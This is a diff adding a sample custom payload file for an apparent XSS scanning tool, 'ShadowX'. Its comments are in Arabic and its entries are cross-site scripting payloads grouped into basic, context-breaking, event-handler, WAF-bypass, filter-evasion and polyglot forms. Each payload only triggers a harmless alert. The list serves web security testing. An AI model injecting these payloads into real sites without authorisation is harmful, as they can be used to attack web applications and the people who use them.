@@ -1,0 +1,36 @@
+# مثال على ملف البايلودات المخصص لـ ShadowX
+# ضع البايلودات الخاصة بك هنا، واحد في كل سطر
+# الأسطر التي تبدأ بـ # سيتم تجاهلها
+
+# Basic XSS
+<script>alert("CUSTOM-XSS")</script>
+<img src=x onerror=alert("CUSTOM-XSS")>
+<svg onload=alert("CUSTOM-XSS")>
+
+# Context Breaking
+";alert("CUSTOM-XSS");//
+';alert("CUSTOM-XSS");//
+</script><script>alert("CUSTOM-XSS")</script>
+
+# Event Handlers
+"><img src=x onerror=alert("CUSTOM-XSS")>
+'><img src=x onerror=alert("CUSTOM-XSS")>
+<input autofocus onfocus=alert("CUSTOM-XSS")>
+
+# WAF Bypass
+<ScRiPt>alert("CUSTOM-XSS")</ScRiPt>
+<script>/**/alert("CUSTOM-XSS")/**/</script>
+<script>eval(alert("CUSTOM-XSS"))</script>
+
+# Advanced Techniques
+<script>Function("alert('CUSTOM-XSS')")();</script>
+<script>window["alert"]("CUSTOM-XSS")</script>
+<script>top["alert"]("CUSTOM-XSS")</script>
+
+# Filter Evasion
+<script>alert(String.fromCharCode(88,83,83))</script>
+<svg><animate onbegin=alert("CUSTOM-XSS")>
+<details open ontoggle=alert("CUSTOM-XSS")>
+
+# Polyglot Payloads
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("CUSTOM-XSS") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("CUSTOM-XSS")//>
